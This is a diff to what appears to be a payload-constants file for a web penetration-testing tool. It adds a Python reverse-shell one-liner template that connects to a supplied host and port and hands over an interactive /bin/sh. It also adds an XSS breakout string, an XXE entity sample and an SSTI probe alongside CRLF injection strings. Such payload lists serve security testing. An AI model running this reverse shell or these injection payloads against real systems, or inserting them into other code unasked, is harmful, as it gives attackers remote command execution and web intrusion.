@@ -1,27 +1,29 @@
 
 
+pyshell = (
+	"python -c 'import socket,subprocess,os;"
+	"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
+	"s.connect((\"{}\",{}));os.dup2(s.fileno(),0);"
+	"os.dup2(s.fileno(),2);"
+	"os.dup2(s.fileno(),1);"
+	"p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+)
+
 CRLF = "\r\n"
 
 CRLF8 ="%E5%98%8A%E5%98%8D"
 
 ## Basic XSS
-
-XSS = "<script>alert(0);</script>"
-
-xss_list = [
-	"",
-	"",
-]
+XSS = "a\"><script>alert(0)</script>\""
 
 ## Basic SQLI
-
-sqli_list = [
-
-]
+XXE = """<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
+	<userInfo>
+		<firstName>John</firstName>
+		<lastName>&example;</lastName>
+	</userInfo>
+"""
 
 ## Server-Side Template injection (SSTI)
-SSTI = "{7*6}"
-
-ssti_list = [
-
-]
+SSTI = "{2*2}"
